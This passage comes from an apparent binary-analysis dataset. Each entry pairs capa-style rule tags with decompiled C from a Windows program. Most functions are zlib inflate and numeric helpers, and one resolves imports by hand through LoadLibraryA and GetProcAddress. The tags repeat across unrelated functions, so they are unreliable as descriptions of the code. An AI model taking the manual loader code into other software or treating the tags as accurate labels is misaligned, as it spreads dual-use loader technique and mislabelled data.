= uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x4557dc + *0x4557c8;\n                }\n                goto code_r0x0043faa3;\n            }\n            iVar13 = *0x4557cc - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x4557d0 + -1;\n            iVar13 = *0x4557d0 + (*0x4557d0 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x4557d0 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0043f897;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0043f897:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x4557d4 + 1 + (*0x4557d4 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0043faa3:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x4557d8 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x4557d8 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.0042d636(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3262
    },
    "004049d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004049d0(void)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    int32_t unaff_EDI;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(unaff_EDI + 0xc0) == 0) || (*(unaff_EDI + 0xc4) == 0)) {\n        return 0;\n    }\n    piVar5 = *(unaff_EDI + 0x144) + *(unaff_EDI + 0xc0);\n    iVar2 = piVar5[3];\n    if (iVar2 == 0) {\n        return iVar2;\n    }\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(*(unaff_EDI + 0x144) + iVar2);\n        if (iVar2 == 0) {\n            return 6;\n        }\n        uVar4 = *(unaff_EDI + 0x154);\n        if (uVar4 <= *(unaff_EDI + 0x150)) {\n            if (uVar4 == 0) {\n                iVar3 = 0x10;\n            }\n            else {\n                iVar3 = uVar4 * 2;\n            }\n            *(unaff_EDI + 0x154) = iVar3;\n            var_ch = fcn.0042d6d0(iVar3 * 4);\n            if (var_ch == 0) {\n                return 3;\n            }\n            if (*(unaff_EDI + 0x150) != 0) {\n                fcn.0042f700(var_ch, *(unaff_EDI + 0x14c), *(unaff_EDI + 0x150) * 4);\n            }\n            fcn.0042d696(*(unaff_EDI + 0x14c));\n            *(unaff_EDI + 0x14c) = var_ch;\n        }\n        *(var_ch + *(unaff_EDI + 0x150) * 4) = iVar2;\n        *(unaff_EDI + 0x150) = *(unaff_EDI + 0x150) + 1;\n        puVar7 = piVar5[4] + *(unaff_EDI + 0x144);\n        puVar6 = puVar7;\n        if (piVar5[1] != 0) {\n            if (*piVar5 == 0) {\n                return 8;\n            }\n            puVar6 = *piVar5 + *(unaff_EDI + 0x144);\n        }\n        uVar4 = *puVar6;\n        while (uVar4 != 0) {\n            if (uVar4 < 0) {\n                uVar4 = uVar4 & 0xffff;\n            }\n            else {\n                uVar4 = uVar4 + 2 + *(unaff_EDI + 0x144);\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, uVar4);\n            *puVar7 = uVar4;\n            if (uVar4 == 0) {\n                return 6;\n            }\n            puVar1 = puVar6 + 1;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n            uVar4 = *puVar1;\n        }\n        iVar2 = piVar5[8];\n        piVar5 = piVar5 + 5;\n        if (iVar2 == 0) {\n            return iVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 833
    },
    "0042d7ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d7ce(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.0042d696(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 83
    },
    "004093d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004093d0(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint arg_ch_00;\n    uint *in_ECX;\n    uint32_t arg_10h;\n    \n    if (arg_8h == 0xffffffff) {\n        fcn.0042cb30(\"string too long\");\n    }\n    uVar1 = in_ECX[5];\n    if (uVar1 < arg_8h) {\n        fcn.00409570(arg_8h, in_ECX[4]);\n        return arg_8h != 0;\n    }\n    if ((arg_ch != '\\0') && (arg_8h < 0x10)) {\n        arg_10h = in_ECX[4];\n        if (arg_8h < in_ECX[4]) {\n            arg_10h = arg_8h;\n        }\n        if (0xf < uVar1) {\n            arg_ch_00 = *in_ECX;\n            if (arg_10h != 0) {\n                fcn.0042f700(in_ECX, arg_ch_00, arg_10h);\n            }\n            fcn.0042d62b(arg_ch_00);\n        }\n        in_ECX[4] = arg_10h;\n        in_ECX[5] = 0xf;\n        *(arg_10h + in_ECX) = 0;\n        return arg_8h != 0;\n    }\n    if (arg_8h == 0) {\n        in_ECX[4] = 0;\n        if (0xf < uVar1) {\n            in_ECX = *in_ECX;\n        }\n        *in_ECX = 0;\n    }\n    return arg_8h != 0;\n}\n",
        "token_count": 394
    },
    "00409ea0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409ea0(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint32_t *puVar2;\n    uchar *puVar3;\n    uint8_t *puVar4;\n    uint8_t **in_EAX;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint var_20h;\n    uchar *var_1ch;\n    uint8_t *var_18h;\n    uchar *var_14h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = *in_EAX;\n    var_10h = in_EAX[1];\n    puVar2 = *(in_ECX + 4);\n    var_4h = *(in_ECX + 0x20);\n    puVar7 = *(in_ECX + 0x34);\n    uVar8 = *(in_ECX + 0x1c);\n    if (puVar7 < *(in_ECX + 0x30)) {\n        var_14h = *(in_ECX + 0x30) + (-1 - puVar7);\n    }\n    else {\n        var_14h = *(in_ECX + 0x2c) - puVar7;\n    }\n    uVar5 = *puVar2;\n    while (uVar5 < 10) {\n    // switch table (10 cases) at 0x40a4d0\n        switch(*(uVar5 * 4 + 0x40a4d0)) {\n        case 0x409ef7:\n            if ((var_14h < 0x102) || (var_10h < 0xa)) {\ncode_r0x00409f94:\n                puVar2[3] = *(puVar2 + 4);\n                puVar2[2] = puVar2[5];\n                *puVar2 = 1;\n                goto code_r0x00409faa;\n            }\n            *(in_ECX + 0x20) = var_4h;\n            *(in_ECX + 0x1c) = uVar8;\n            in_EAX[1] = var_10h;\n            puVar4 = *in_EAX;\n            *in_EAX = var_ch;\n            in_EAX[2] = in_EAX[2] + (var_ch - puVar4);\n            *(in_ECX + 0x34) = puVar7;\n            arg_8h = fcn.0040b790(*(puVar2 + 4), *(puVar2 + 0x11), puVar2[5], puVar2[6], in_ECX, in_EAX);\n            var_ch = *in_EAX;\n            var_10h = in_EAX[1];\n            uVar8 = *(in_ECX + 0x1c);\n            var_4h = *(in_ECX + 0x20);\n            puVar7 = *(in_ECX + 0x34);\n            if (puVar7 < *(in_ECX + 0x30)) {\n                var_14h = *(in_ECX + 0x30) + (-1 - puVar7);\n            }\n            else {\n                var_14h = *(in_ECX + 0x2c) - puVar7;\n            }\n            if (arg_8h == 0) goto code_r0x00409f94;\n            *puVar2 = (arg_8h != 1) * 2 + 7;\n            goto code_r0x0040a3af;\n        case 0x409faa:\ncode_r0x00409faa:\n            for (; uVar8 < puVar2[3]; uVar8 = uVar8 + 8) {\n                if (var_10h == NULL) goto code_r0x0040a3ec;\n                var_10h = var_10h + -1;\n                uVar1 = *var_ch;\n                var_ch = var_ch + 1;\n                var_4h = var_4h | uVar1 << (uVar8 & 0x1f);\n                arg_8h = 0;\n            }\n            var_18h = puVar2[2] + (*(puVar2[3] * 4 + 0x44d068) & var_4h) * 8;\n            var_4h = var_4h >> (var_18h[1] & 0x1f);\n            uVar8 = uVar8 - var_18h[1];\n            uVar1 = *var_18h;\n            uVar5 = uVar1;\n            if (uVar5 == 0) {\n                puVar2[2] = *(var_18h + 4);\n                *puVar2 = 6;\n                goto code_r0x0040a3af;\n            }\n            if ((uVar1 & 0x10) != 0) {\n                puVar2[2] = uVar5 & 0xf;\n                puVar2[1] = *(var_18h + 4);\n                *puVar2 = 2;\n                goto code_r0x0040a3af;\n            }\n            if ((uVar1 & 0x40) != 0) {\n                if ((uVar1 & 0x20) != 0) {\n                    *puVar2 = 7;\n                    goto code_r0x0040a3af;\n                }\n                *puVar2 = 9;\n                in_EAX[6] = \"invalid literal/length code\";\n                goto code_r0x0040a42b;\n            }\n            goto code_r0x0040a05e;\n        case 0x40a094:\n            uVar5 = puVar2[2];\n            for (; uVar8 < uVar5; uVar8 = uVar8 + 8) {\n                if (var_10h == NULL) goto code_r0x0040a3ec;\n                var_10h = var_10h + -1;\n                uVar1 = *var_ch;\n                var_ch = var_ch + 1;\n                var_4h = var_4h | uVar1 << (uVar8 & 0x1f);\n                arg_8h = 0;\n            }\n            puVar2[1] = puVar2[1] + (*(uVar5 * 4 + 0x44d068) & var_4h);\n            var_4h = var_4h >> (uVar5 & 0x1f);\n            uVar8 = uVar8 - uVar5;\n            puVar2[3] = *(puVar2 + 0x11);\n            puVar2[2] = puVar2[6];\n            *puVar2 = 3;\n            break;\n        case 0x40a106:\n            break;\n        case 0x40a1ba:\n            uVar5 = puVar2[2];\n            for (; uVar8 < uVar5; uVar8 = uVar8 + 8) {\n                if (var_10h == NULL) goto code_r0x0040a3ec;\n                var_10h = var_10h + -1;\n                uVar1 = *var_ch;\n                var_ch = var_ch + 1;\n                var_4h = var_4h | uVar1 << (uVar8 & 0x1f);\n                arg_8h = 0;\n            }\n            puVar2[3] = puVar2[3] + (*(uVar5 * 4 + 0x44d068) & var_4h);\n            var_4h = var_4h >> (uVar5 & 0x1f);\n            uVar8 = uVar8 - uVar5;\n            *puVar2 = 5;\n        case 0x40a221:\n            var_1ch = puVar7 + -puVar2[3];\n            if (var_1ch < *(in_ECX + 0x28)) {\n                do {\n                    var_1ch = var_1ch + (*(in_ECX + 0x2c) - *(in_ECX + 0x28));\n                } while (var_1ch < *(in_ECX + 0x28));\n            }\n            uVar5 = puVar2[1];\n            while (uVar5 != 0) {\n                puVar6 = puVar7;\n                if (var_14h == NULL) {\n                    if (puVar7 == *(in_ECX + 0x2c)) {\n                        var_14h = *(in_ECX + 0x30);\n                        puVar6 = *(in_ECX + 0x28);\n                        if (var_14h != puVar6) {\n                            if (puVar6 < var_14h) {\n                                var_14h = var_14h + (-1 - puVar6);\n                            }\n                            else {\n                                var_14h = *(in_ECX + 0x2c) - puVar6;\n                            }\n                            puVar7 = puVar6;\n                            if (var_14h != NULL) goto code_r0x0040a2dc;\n                        }\n                    }\n                    *(in_ECX + 0x34) = puVar7;\n                    arg_8h = fcn.00409d60(arg_8h);\n                    puVar6 = *(in_ECX + 0x34);\n                    if (puVar6 < *(in_ECX + 0x30)) {\n                        var_14h = *(in_ECX + 0x30) + (-1 - puVar6);\n                    }\n                    else {\n                        var_14h = *(in_ECX + 0x2c) - puVar6;\n                    }\n                    if (puVar6 == *(in_ECX + 0x2c)) {\n                        puVar7 = *(in_ECX + 0x28);\n                        puVar3 = *(in_ECX + 0x30);\n                        if (puVar3 != puVar7) {\n                            puVar6 = puVar7;\n                            if (puVar7 < puVar3) {\n                                var_14h = puVar3 + (-1 - puVar7);\n                            }\n                            else {\n                                var_14h = *(in_ECX + 0x2c) - puVar7;\n                            }\n                        }\n                    }\n                    if (var_14h == NULL) goto code_r0x0040a43e;\n                }\ncode_r0x0040a2dc:\n                *puVar6 = *var_1ch;\n                var_1ch = var_1ch + 1;\n                var_14h = var_14h + -1;\n                puVar7 = puVar6 + 1;\n                arg_8h = 0;\n                if (var_1ch == *(in_ECX + 0x2c)) {\n                    var_1ch = *(in_ECX + 0x28);\n                }\n                puVar2[1] = puVar2[1] - 1;\n                uVar5 = puVar2[1];\n            }\ncode_r0x0040a3a9:\n            *puVar2 = 0;\n            goto code_r0x0040a3af;\n        case 0x40a316:\n            puVar6 = puVar7;\n            if (var_14h == NULL) {\n                if (puVar7 == *(in_ECX + 0x2c)) {\n                    var_14h = *(in_ECX + 0x30);\n                    puVar6 = *(in_ECX + 0x28);\n                    if (var_14h != puVar6) {\n                        if (puVar6 < var_14h) {\n                            var_14h = var_14h + (-1 - puVar6);\n                        }\n                        else {\n                            var_14h = *(in_ECX + 0x2c) - puVar6;\n                        }\n                        puVar7 = puVar6;\n                        if (var_14h != NULL) goto code_r0x0040a392;\n                    }\n                }\n                *(in_ECX + 0x34) = puVar7;\n                arg_8h = fcn.00409d60(arg_8h);\n                puVar6 = *(in_ECX + 0x34);\n                if (puVar6 < *(in_ECX + 0x30)) {\n                    var_14h = *(in_ECX + 0x30) + (-1 - puVar6);\n                }\n                else {\n                    var_14h = *(in_ECX + 0x2c) - puVar6;\n                }\n                if (puVar6 == *(in_ECX + 0x2c)) {\n                    puVar7 = *(in_ECX + 0x28);\n                    puVar3 = *(in_ECX + 0x30);\n                    if (puVar3 != puVar7) {\n                        puVar6 = puVar7;\n                        if (puVar7 < puVar3) {\n                            var_14h = puVar3 + (-1 - puVar7);\n                        }\n                        else {\n                            var_14h = *(in_ECX + 0x2c) - puVar7;\n                        }\n                    }\n                }\n                if (var_14h == NULL) {\ncode_r0x0040a43e:\n                    *(in_ECX + 0x20) = var_4h;\n                    *(in_ECX + 0x1c) = uVar8;\n                    in_EAX[1] = var_10h;\n                    puVar7 = puVar6;\n                    goto code_r0x0040a3fc;\n                }\n            }\ncode_r0x0040a392:\n            *puVar6 = *(puVar2 + 2);\n            puVar7 = puVar6 + 1;\n            var_14h = var_14h + -1;\n            arg_8h = 0;\n            goto code_r0x0040a3a9;\n        case 0x40a44f:\n            if (7 < uVar8) {\n                var_10h = var_10h + 1;\n                uVar8 = uVar8 - 8;\n                var_ch = var_ch + -1;\n            }\n            *(in_ECX + 0x34) = puVar7;\n            uVar9 = fcn.00409d60(arg_8h);\n            puVar7 = *(in_ECX + 0x34);\n            if (*(in_ECX + 0x30) != puVar7) {\n                *(in_ECX + 0x20) = var_4h;\n                *(in_ECX + 0x1c) = uVar8;\n                in_EAX[1] = var_10h;\n                puVar4 = *in_EAX;\n                *in_EAX = var_ch;\n                in_EAX[2] = in_EAX[2] + (var_ch - puVar4);\n                *(in_ECX + 0x34) = puVar7;\n                fcn.00409d60(uVar9);\n                return;\n            }\n            *puVar2 = 8;\n        case 0x40a4b0:\n            *(in_ECX + 0x20) = var_4h;\n            *(in_ECX + 0x1c) = uVar8;\n            in_EAX[1] = var_10h;\n            uVar9 = 1;\n            goto code_r0x0040a3ce;\n        case 0x40a4c6:\n            uVar9 = 0xfffffffd;\n            goto code_r0x0040a3bf;\n        }\n        for (; uVar8 < puVar2[3]; uVar8 = uVar8 + 8) {\n            if (var_10h == NULL) goto code_r0x0040a3ec;\n            var_10h = var_10h + -1;\n            uVar1 = *var_ch;\n            var_ch = var_ch + 1;\n            var_4h = var_4h | uVar1 << (uVar8 & 0x1f);\n            arg_8h = 0;\n        }\n        var_18h = puVar2[2] + (*(puVar2[3] * 4 + 0x44d068) & var_4h) * 8;\n        var_4h = var_4h >> (var_18h[1] & 0x1f);\n        uVar1 = *var_18h;\n        uVar5 = uVar1;\n        uVar8 = uVar8 - var_18h[1];\n        if ((uVar1 & 0x10) == 0) {\n            if ((uVar1 & 0x40) != 0) {\n                *puVar2 = 9;\n                in_EAX[6] = \"invalid distance code\";\ncode_r0x0040a42b:\n                *(in_ECX + 0x20) = var_4h;\n                *(in_ECX + 0x1c) = uVar8;\n                in_EAX[1] = var_10h;\n                uVar9 = 0xfffffffd;\n                goto code_r0x0040a3ce;\n            }\ncode_r0x0040a05e:\n            puVar2[3] = uVar5;\n            puVar2[2] = var_18h + *(var_18h + 4) * 8;\n        }\n        else {\n            puVar2[2] = uVar5 & 0xf;\n            puVar2[3] = *(var_18h + 4);\n            *puVar2 = 4;\n        }\ncode_r0x0040a3af:\n        uVar5 = *puVar2;\n    }\n    uVar9 = 0xfffffffe;\ncode_r0x0040a3bf:\n    *(in_ECX + 0x20) = var_4h;\n    *(in_ECX + 0x1c) = uVar8;\n    in_EAX[1] = var_10h;\ncode_r0x0040a3ce:\n    puVar4 = *in_EAX;\n    *in_EAX = var_ch;\n    in_EAX[2] = in_EAX[2] + (var_ch - puVar4);\n    *(in_ECX + 0x34) = puVar7;\n    fcn.00409d60(uVar9);\n    return;\ncode_r0x0040a3ec:\n    *(in_ECX + 0x20) = var_4h;\n    *(in_ECX + 0x1c) = uVar8;\n    in_EAX[1] = NULL;\ncode_r0x0040a3fc:\n    puVar4 = *in_EAX;\n    *in_EAX = var_ch;\n    in_EAX[2] = in_EAX[2] + (var_ch - puVar4);\n    *(in_ECX + 0x34) = puVar7;\n    fcn.00409d60(arg_8h);\n    return;\n}\n",
        "token_count": 4255
    },
    "0040b590": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b590(uint arg_8h, int32_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_24h;\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint var_4h;\n    \n    arg_24h = (**(unaff_EBX + 0x20))(*(unaff_EBX + 0x28), 0x13, 4);\n    if (arg_24h == 0) {\n        return -4;\n    }\n    iVar1 = fcn.0040b050(0x13, 0x13, 0, 0, arg_10h, arg_ch, arg_14h, arg_24h);\n    if (iVar1 == -3) {\n        *(unaff_EBX + 0x18) = \"oversubscribed dynamic bit lengths tree\";\n    }\n    else if ((iVar1 == -5) || (*arg_ch == 0)) {\n        *(unaff_EBX + 0x18) = \"incomplete dynamic bit lengths tree\";\n        iVar1 = -3;\n    }\n    (**(unaff_EBX + 0x24))(*(unaff_EBX + 0x28), arg_24h);\n    return iVar1;\n}\n",
        "token_count": 291
    },
    "0040be50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040be50(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        if (*(*(in_EAX + 0x1c) + 0x14) != 0) {\n            fcn.0040afc0();\n        }\n        (**(in_EAX + 0x24))(*(in_EAX + 0x28), *(in_EAX + 0x1c));\n        *(in_EAX + 0x1c) = 0;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 163
    },
    "0040bf50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040bf50(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t **in_EAX;\n    uint32_t uVar4;\n    int32_t arg_8h;\n    uint var_4h;\n    \n    if (((in_EAX != NULL) && (in_EAX[7] != NULL)) && (*in_EAX != NULL)) {\n        uVar2 = *in_EAX[7];\n        arg_8h = -5;\n        do {\n    // switch table (14 cases) at 0x40c2b8\n            switch(uVar2) {\n            case 0:\n                if (in_EAX[1] == NULL) {\n                    return arg_8h;\n                }\n                in_EAX[2] = in_EAX[2] + 1;\n                in_EAX[1] = in_EAX[1] + -1;\n                uVar1 = **in_EAX;\n                *(in_EAX[7] + 4) = uVar1;\n                *in_EAX = *in_EAX + 1;\n                arg_8h = 0;\n                if ((uVar1 & 0xf) == 8) {\n                    puVar3 = in_EAX[7];\n                    uVar4 = (puVar3[1] >> 4) + 8;\n                    if (uVar4 < puVar3[4] || uVar4 == puVar3[4]) {\n                        *puVar3 = 1;\n                        goto code_r0x0040bffb;\n                    }\n                    *puVar3 = 0xd;\n                    in_EAX[6] = \"invalid window size\";\n                    goto code_r0x0040c183;\n                }\n                *in_EAX[7] = 0xd;\n                in_EAX[6] = \"unknown compression method\";\n                *(in_EAX[7] + 4) = 5;\n                break;\n            case 1:\ncode_r0x0040bffb:\n                if (in_EAX[1] == NULL) {\n                    return arg_8h;\n                }\n                in_EAX[2] = in_EAX[2] + 1;\n                puVar3 = in_EAX[7];\n                in_EAX[1] = in_EAX[1] + -1;\n                uVar1 = **in_EAX;\n                *in_EAX = *in_EAX + 1;\n                arg_8h = 0;\n                if ((puVar3[1] * 0x100 + uVar1) % 0x1f != 0) {\n                    *puVar3 = 0xd;\n                    in_EAX[6] = \"incorrect header check\";\n                    goto code_r0x0040c183;\n                }\n                if ((uVar1 & 0x20) == 0) {\n                    *puVar3 = 7;\n                    break;\n                }\n                *in_EAX[7] = 2;\n            case 2:\n                if (in_EAX[1] == NULL) {\n                    return arg_8h;\n                }\n                in_EAX[2] = in_EAX[2] + 1;\n                in_EAX[1] = in_EAX[1] + -1;\n                *(in_EAX[7] + 8) = **in_EAX << 0x18;\n                arg_8h = 0;\n                *in_EAX = *in_EAX + 1;\n                *in_EAX[7] = 3;\ncode_r0x0040c1e4:\n                if (in_EAX[1] != NULL) {\n                    in_EAX[2] = in_EAX[2] + 1;\n                    in_EAX[1] = in_EAX[1] + -1;\n                    *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX * 0x10000;\n                    arg_8h = 0;\n                    *in_EAX = *in_EAX + 1;\n                    *in_EAX[7] = 4;\ncode_r0x0040c20d:\n                    if (in_EAX[1] != NULL) {\n                        in_EAX[2] = in_EAX[2] + 1;\n                        in_EAX[1] = in_EAX[1] + -1;\n                        *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX * 0x100;\n                        arg_8h = 0;\n                        *in_EAX = *in_EAX + 1;\n                        *in_EAX[7] = 5;\ncode_r0x0040c236:\n                        if (in_EAX[1] != NULL) {\n                            in_EAX[2] = in_EAX[2] + 1;\n                            in_EAX[1] = in_EAX[1] + -1;\n                            *(in_EAX[7] + 8) = *(in_EAX[7] + 8) + **in_EAX;\n                            *in_EAX = *in_EAX + 1;\n                            in_EAX[0xc] = *(in_EAX[7] + 8);\n                            *in_EAX[7] = 6;\n                            return 2;\n                        }\n                    }\n                }\n                return arg_8h;\n            case 3:\n                goto code_r0x0040c1e4;\n            case 4:\n                goto code_r0x0040c20d;\n            case 5:\n                goto code_r0x0040c236;\n            case 6:\n                *in_EAX[7] = 0xd;\n                in_EAX[6] = \"need dictionary\";\n                *(in_EAX[7] + 4) = 0;\n                return -2;\n            case 7:\n                arg_8h = fcn.0040a610(arg_8h);\n                if (arg_8h == -3) {\n                    *in_EAX[7] = 0xd;\n                    *(in_EAX[7] + 4) = 0;\n                }\n                else {\n                    if (arg_8h == 0) {\n                        return 0;\n                    }\n                    if (arg_8h != 1) {\n                        return arg_8h;\n                    }\n                    arg_8h = 0;\n                    fcn.0040a500();\n                    puVar3 = in_EAX[7];\n                    if (puVar3[3] == 0) {\n                        *puVar3 = 8;\n                        goto code_r0x0040c0c3;\n                    }\n                    *puVar3 = 0xc;\n                }\n                break;\n            case 8:\ncode_r0x0040c0c3:\n                if (in_EAX[1] == NULL) {\n                    return arg_8h;\n                }\n                in_EAX[2] = in_EAX[2] + 1;\n                in_EAX[1] = in_EAX[1] + -1;\n                *(in_EAX[7] + 8) = **in_EAX << 